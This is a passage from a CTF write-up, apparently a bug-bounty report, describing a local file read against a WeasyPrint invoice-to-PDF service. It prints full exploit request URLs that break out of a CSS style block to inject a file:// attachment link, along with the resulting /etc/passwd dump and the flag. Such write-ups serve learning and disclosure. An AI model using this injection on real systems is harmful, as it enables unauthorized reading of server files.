+User-Agent: WeasyPrint 44 (http://weasyprint.org/)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
+
+^C
+```
+
+Yup...and we now also know that it's Weasyprint. At this point, I wasted a lot of time trying to use SVG to somehow include a file URL to get LFI or to get XXE. But no dice. I also tried to use `@font-face src`.
+
+Failing that I decided to check Weasyprint's GitHub issues, and I saw [this (merged) pull request](https://github.com/Kozea/WeasyPrint/pull/177). That's golden! It's a LFI for free, if we can somehow manage to inject an `<a>` or `<link>` tag. SVG won't work for this, because Weasyprint renders SVG by handing it off to CairoSVG. So we need a way to break out of the CSS or table data into the HTML. At this point I simply tried putting `<` in every field.
+
+```
+GET http://172.28.0.3/invoices/preview?d={"companyName":"<","email":"<","invoiceNumber":"<","date":"<","items":[["1","<","<","1"]],"styles":{"<":{"<":"<"}}}
+
+		&lt; {
+			<: &lt;;
+		}
+...
+```
+
+Would you look at that...every field is sanitized **except** the CSS selector, lol. But apparently, `</style>` is sanitized out. OK, so what if I make the tag malformed?
+
+```
+GET http://172.28.0.3/invoices/preview?d={"companyName":"<","email":"<","invoiceNumber":"<","date":"<","items":[["1","<","<","1"]],"styles":{"<":{"</style%20<!--":"<"}}}
+
+		&lt; {
+			</style <!--: &lt;;
+		}
+```
+
+Nice, so now we just need to inject the `<a>` tag and we will get LFI for free in the form of a PDF attachment.
+
+```
+GET http://172.28.0.3/invoices/pdfize?d={"companyName":"a","email":"b","invoiceNumber":"c","date":"d","items":[["1","a","b","10"]],"styles":{"asdfasdf":{"</style%20<!--":"","!--><a%20href=\"file:///etc/passwd\"%20rel=\"attachment\">wow</a%20<!--":""}}}
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+nginx:x:101:102:nginx user,,,:/nonexistent:/bin/false
+messagebus:x:102:103::/var/run/dbus:/bin/false
+```
+
+Boom! Pwned :)
+
+So far all of the webapps have been at `/app` mounted in Docker. So let's just try `/app/main.py`.
+
+```python
+"""
+CONGRATULATIONS!
+
+If you're reading this, you've made it to the end of the road for this CTF.
+
+Go to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.
+Make sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!
+
+Congratulations again, and I'm sorry for the red herrings. :)
+"""
+```
+
+Nice. And just for fun, here's the crappy CSS sanitization:
+
+```python
+def stripClosingTags(data):
+	return re.sub(r'<\s*/[^<]+?>', '', data)
+```
+
+## Supporting Material/References:
+
+{F440498}
+{F440500}
+{F440501}
+
+## Impact
+
+An attacker could download the confidential reports and invoices on the internal "Accounting" server, as well as fraudulently create new Invoices. The attacker can also execute arbitrary code on the company intranet because they are able to execute code on the thermostat's administration web panel's server.
